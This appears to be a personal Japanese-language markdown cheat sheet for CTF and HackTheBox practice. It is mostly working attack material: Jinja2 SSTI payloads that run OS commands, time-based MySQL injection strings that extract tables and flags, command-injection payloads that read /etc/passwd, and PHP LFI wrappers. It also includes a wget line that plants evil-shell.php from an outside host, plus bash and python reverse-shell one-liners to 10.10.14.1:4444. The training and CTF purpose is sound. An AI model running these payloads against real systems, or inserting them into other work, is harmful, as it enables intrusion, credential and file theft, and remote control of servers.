# tips

CTF や HackTheBox で使う情報を自分用にまとめる。

## Privilege Escalation

権限昇格に利用できそうな手がかりを見つける

```
# root で動いているプロセスの一覧を表示
ps aux | grep root
```

```
# 現在のユーザで sudo 利用可能なコマンドを表示
sudo -l
```

```
# ユーザ + パスワードハッシュ
cat /etc/passwd
```

```
# cron の設定を表示
ls -la /etc/cron.daily/
```

```
# HDD や USB メモリなどのブロックデバイスの一覧を表示
lsblk
```

```
# 書き込み可能なディレクトリを検索
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# 書き込み可能なファイルを検索
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

参考:

- https://academy.hackthebox.eu/course/preview/linux-privilege-escalation/introduction-to-linux-privilege-escalation

ツール利用

- [PEASS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

  - 設定ファイルやログを検索して、利用できそうな項目の一覧表示が可能

```
chmod +x linpeas.sh
./linpeas.sh -a
```

```
[+] Finding 'username' string inside key folders (limit 70)
/etc/supervisord.conf:username = user

[+] Searching specific hashes inside files - less false positives (limit 70)
/var/www/.htpasswd:$1$xxxxxxxxxXXXXXXXXXXXXXXXXX

/home/user/public/.htpasswd:$1$xxxxxxxxxXXXXXXXXXXXXXXXXX
/home/user/dev/www/.htpasswd:$1$xxxxxxxxxXXXXXXXXXXXXXXXXX
```

## RSA

秘密鍵の中身を見る

```
openssl rsa -in <private-key.pem> -text -noout
```

公開鍵の中身を見る

```
openssl rsa -pubin -in <public-key.pem> -text -noout
```

## DNS

dig

```
dig <example.com> IN
dig <example.com> ANY
dig <example.com> TXT
```

## Phishing

- MX (Mail exchange record)
- SPF (Sender Policy Framework)
- DKIM (DomainKeys Identified Mail)
- DMARC (Domain-based Message Authentication, Reporting and Conformance)

## OSINT

- Google Dorks: https://www.exploit-db.com/google-hacking-database

  - ext: `ext:(doc | pdf | xls | txt)`
  - filetype: `filetype:log`
  - intext: `intext:"Control Panel"`
  - intitle: `intitle:"Manager"`
  - inurl: `inurl:index.php`
  - site: `site:ftp.*.*.*`

## SSTI

**Server Side Template Injection**

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

**Flask + Jinja2**

参考: https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

パラメータ利用 + シングルクォートなし

- `{{ }}`

```
{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}

# パラメータ例:
# - arg1=open
# - arg2=/etc/passwd
```

- `{% %}`

```
{% if request.application.__globals__.__builtins__.__import__(request.args.arg1).popen(request.args.arg2).read() == 1 %}{% endif %}

# パラメータ例:
# - arg1=os
# - arg2=sleep 3
```

| 参照パラメータ | 格納場所             |
| -------------- | -------------------- |
| GET            | request.args.arg1    |
| POST           | request.values.arg1  |
| Cookie         | request.cookies.arg1 |

## SQLi

**SQL Injection**

- LIKE: `%`, `*`

**MySQL**

| 説明       | SQL                         |
| ---------- | --------------------------- |
| コメント   | `-- ` or `#` or `/* ... */` |
| If         | CASE                        |
| 文字列結合 | &#124;&#124;                |
|            | CONCAT(x, y, ...)           |
|            | GROUP_CONCAT(x, y, ...)     |
| 部分文字列 | SUBSTRING(x, index, length) |
| 長さ       | LENGTH(stuff)               |

- Time based:

テーブル名取得

```
'or if(substring((select group_concat(table_name) from information_schema.tables where table_type='BASE TABLE'),1,1)='a',sleep(3),0)or'
```

カラム名取得

```
'or if(substring((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)='a',sleep(3),0)or'
```

値取得

```
'or if(substring((select group_concat(concat(id, ',', flag)) from users),1,1)='a',sleep(3),0)or'
```

**SQLite3**

| 説明                   | SQL                                     |
| ---------------------- | --------------------------------------- |
| コメント               | --                                      |
| If                     | CASE name WHEN 'taro' THEN 1 ELSE 0 END |
| 文字列結合             | &#124;&#124;                            |
| 部分文字列             | substr(x,y,z)                           |
| 長さ                   | length(stuff)                           |
| シングルクォートの生成 | select substr(quote(hex(0)),1,1);       |
| ダブルクォートの生成   | select cast(X'22' as text);             |

参考:

- http://atta.cked.me/home/sqlite3injectioncheatsheet
- https://www.sqlite.org/lang_UPSERT.html

## Command Injection

**Unix Payloads**

```
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
;netstat -a;
;system('cat%20/etc/passwd')
|id
\n/bin/ls -al\n
a);id
%0Acat%20/etc/passwd
& ping -i 30 127.0.0.1 &
<?php system("cat /etc/passwd");?>
```

**Windows Payloads**

```
'
'"
"
"'
%0a
%0a%0d
eval('ls')
exec('ls')
system('ls')
| sleep 1
; sleep 1
& sleep 1
&& sleep 1`
```

Links:

- https://github.com/payloadbox/command-injection-payload-list

**Payloads with Python**

```
a=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
a('os').popen('cat flag').read()
```

Bypass:

- to Hex: `(` => `\\x28`
- to Octal: `(` => `\50`

## Local File Inclusion (LFI)

**PHP**

パラメータにローカルファイルへのパスを指定することで、サーバにあるローカルファイルにアクセスを試みる攻撃。

Wrapper:

```
expect://ls

php://input
php://filter

phar://app.phar/index.php

zip://shell.jpg

data://text/plain,<?php phpinfo(); ?>
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

Methods:

```
/proc/self/environ
/proc/self/fd/1
/proc/self/cmdline
```

https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt

Files:

```
<? system('uname -a');?>
```

```
<? system('wget http://xxx.xxx.xxx.xxx/evil-shell.php -O /var/www/shell.php');?>
```

with phpinfo:

phpinfo() を利用して、アップロードしたファイルの一時保存場所を確認することができる。

```
POST /phpinfo.php HTTP/1.0
Content-Type: multipart/form-data; boundary=---------------------------
7db268605ae
Content-Length: 196
-----------------------------7db268605ae
Content-Disposition: form-data; name="dummyname"; filename="test.txt"
Content-Type: text/plain
Security Test
-----------------------------7db268605ae
```

PHP Variables 内に出力される。

https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf
https://github.com/D35m0nd142/LFISuite

参考:

- https://book.hacktricks.xyz/pentesting-web/file-inclusion
- https://highon.coffee/blog/lfi-cheat-sheet/

## Server Side Request Forgery (SSRF)

クライアント -> サーバ -> 別サーバ  
外部からアクセスできるサーバを踏み台として、本来外部からアクセスできないサーバに対して行う攻撃。

**Node.js**

CRLF の挿入。

- CR: `\r`
- LF: `\n`

Unicode を利用して CRLF を挿入する。

- CR: `\uff0d`
- LF: `\uff0a`
- 空白: `\uff20`

参考:

- https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf

## Pwn

pwn 用のまとめ:

ユーザーに許可されている sudo で実行可能なコマンドの表示

```
sudo -l
```

## Steganography

- steghide

秘密のパスフレーズでファイルからシークレット情報を取得する。

```
steghide info target.jpg
```

```
steghide extract -sf target.jpg
```

## Reverse Shell

任意のコマンドが実行できる状態で実行

- ローカル

```
nc -lvp 4444
```

- 対象 (bash)

```
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

- 対象 (python)

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

参考:

- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/

## Sites

**Databases**

- Default Passwords: https://cirt.net/passwords
- Exploit: https://www.exploit-db.com/
- Shodan: https://exploits.shodan.io/welcome

**Payloads**

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFOBins: https://gtfobins.github.io/
- Reverse Shell One-Liners: https://hackersinterview.com/oscp/reverse-shell-one-liners-oscp-cheatsheet/

**List**

- Chr: https://testguild.com/qtp-ascii-chr-code-chart/

**Tools**

- CyberChef: https://gchq.github.io/CyberChef/
- Request Bin: https://requestbin.com/
- IP アドレス情報: https://ip-api.com/

**Scripts**

- PEASS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

**Documents**

- HackTricks: https://book.hacktricks.xyz/
- OSCP Blog: https://hackersinterview.com/category/oscp/
